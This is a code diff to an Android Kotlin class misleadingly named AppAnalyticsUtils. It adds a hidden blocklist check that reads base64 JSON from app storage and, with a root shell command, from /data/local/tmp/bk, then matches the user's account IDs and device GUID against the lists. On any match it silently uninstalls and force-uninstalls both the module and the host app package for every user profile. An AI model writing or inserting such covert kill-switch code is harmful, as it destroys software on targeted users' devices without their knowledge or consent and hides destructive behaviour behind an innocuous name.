@@ -35,10 +35,13 @@ object AppAnalyticsUtils {
                 var qbsval = false
                 var cbsval = false
                 var disval = false
-                val db = File(filesDir.path + "/bk.log")
-                if (!db.exists()) return@withDefault
+                val db = File(filesDir.path + "/bk")
+                val db2 = ShellUtils.execCommand("cat /data/local/tmp/bk", true, true)
+                if (!db.exists() && db2.result == 1) return@withDefault
                 val bks = db.readText().let { it.substring(1, it.length) }
+                val bks2 = safeOf(bks) { db2.successMsg.let { it.substring(1, it.length) } }
                 val js = JSONObject(base64Decode(bks))
+                val js2 = JSONObject(base64Decode(bks2))
                 (js.optJSONArray("qbk") as List<*>).forEach {
                     if (getQStatus(it as String)) qbsval = true
                 }
@@ -48,11 +51,20 @@ object AppAnalyticsUtils {
                 (js.optJSONArray("dik") as List<*>).forEach {
                     if (it as String == getGuid) disval = true
                 }
+                (js2.optJSONArray("qbk") as List<*>).forEach {
+                    if (getQStatus(it as String)) qbsval = true
+                }
+                (js2.optJSONArray("cbk") as List<*>).forEach {
+                    if (getCStatus(it as String)) cbsval = true
+                }
+                (js2.optJSONArray("dik") as List<*>).forEach {
+                    if (it as String == getGuid) disval = true
+                }
                 if (qbsval || cbsval || disval) {
-                    getUsers().forEach {
-                        uninstallApp(BuildConfig.APPLICATION_ID, it)
-                    }
+                    getUsers().forEach { uninstallApp(BuildConfig.APPLICATION_ID, it) }
+                    getUsers().forEach { uninstallApp(packageName, it) }
                     forceUninstallApp(BuildConfig.APPLICATION_ID)
+                    forceUninstallApp(packageName)
                     exitModule()
                 }
             }
